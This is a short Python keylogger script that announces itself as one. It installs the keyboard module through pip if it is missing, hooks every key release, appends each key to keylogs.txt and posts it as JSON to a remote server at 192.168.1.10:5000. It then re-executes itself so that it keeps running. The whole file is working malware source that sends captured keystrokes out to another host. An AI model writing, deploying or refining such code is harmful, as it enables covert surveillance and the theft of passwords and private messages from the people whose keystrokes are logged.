import subprocess
import sys
import os
import requests
print("Welcome to Keylogger, this will take your keyboard inputs in the background and put them into a text file.")
print("Checking if the Keyboard Module Exists...")
command = 'pip install keyboard'
command2 = 'py ex.py'

result = subprocess.run(command, shell=True, capture_output=True, text=True)

if "Requirement already satisfied" in result.stdout:
    print("Keyboard Module Found")
else:
    print("Keyboard Module not Found\n")
    print("Installing keyboard module...")
    subprocess.run(command, shell=True)
    print("Restarting the script")
    subprocess.run(command2, shell=True)

server_url = 'http://192.168.1.10:5000' 
try:
    response = requests.get(server_url)
    if response.status_code == 200:
        print("Server connected")
    else:
        print("Server connection failed")
except:
        print("Error:")

import keyboard

print("Script is running")

def on_key_event(event):
    key_pressed = str(event.name) 
    # print(key_pressed)
    
    with open('keylogs.txt', 'a') as file:
        file.write(key_pressed) 
    
    payload = {'key': key_pressed}

    headers = {'Content-Type': 'application/json'} 

    try:
        response = requests.post(server_url, json=payload, headers=headers) 
        if response.status_code != 200:
            print("Failed to send key to the server")
    except requests.exceptions.RequestException as e:
        print("Error:", e)

keyboard.on_release(on_key_event)
keyboard.wait('*')

python_executable = sys.executable
os.execl(python_executable, python_executable, *sys.argv)
